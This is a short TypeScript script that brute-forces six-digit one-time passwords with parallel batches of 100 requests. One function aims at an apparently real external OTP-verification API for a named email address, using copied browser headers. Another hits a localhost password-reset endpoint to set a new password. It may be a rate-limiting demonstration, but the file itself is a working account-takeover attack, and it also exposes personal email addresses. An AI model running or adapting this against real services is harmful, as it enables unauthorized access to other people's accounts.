import axios from 'axios';

async function sendRequest(otp: string) {
    let config = {
        method: 'get',
        maxBodyLength: Infinity,
        url: `https://harkiratapi.classx.co.in/get/otpverify?useremail=harkirat.iitr%40gmail.com&otp=${otp}&mydeviceid=&mydeviceid2=`,
        headers: { 
            'accept': '*/*', 
            'accept-language': 'en-US,en;q=0.9', 
            'auth-key': 'appxapi', 
            'client-service': 'Appx', 
            'device-type': '', 
            'origin': 'https://harkirat.classx.co.in', 
            'priority': 'u=1, i', 
            'referer': 'https://harkirat.classx.co.in/', 
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"', 
            'sec-ch-ua-mobile': '?0', 
            'sec-ch-ua-platform': '"macOS"', 
            'sec-fetch-dest': 'empty', 
            'sec-fetch-mode': 'cors', 
            'sec-fetch-site': 'same-site', 
            'source': 'website', 
            'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
        }
    };

    try {
        await axios.request(config);
    }catch(e) {

    }
}

async function sendLocalRequest(otp: string) {

    let data = JSON.stringify({
        "email": "nirmaljyotib@gmail.com",
        "otp": otp,
        "newPassword": "alpha"
    });

    let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'http://localhost:8000/reset-password',
        headers: { 
            'Content-Type': 'application/json'
        },
        data : data
    };

    try {
        await axios.request(config);
    }catch(err) {

    }
}

async function main() {
    for(let i = 100000; i <= 999999; i+=100) {
        
        const p = [];
        console.log(i);
        
        for(let j = 0; j < 100; j++) {
            p.push(sendLocalRequest((i+j).toString()));
        }

        // console.log(p);
        await Promise.all(p);
    }
}

main();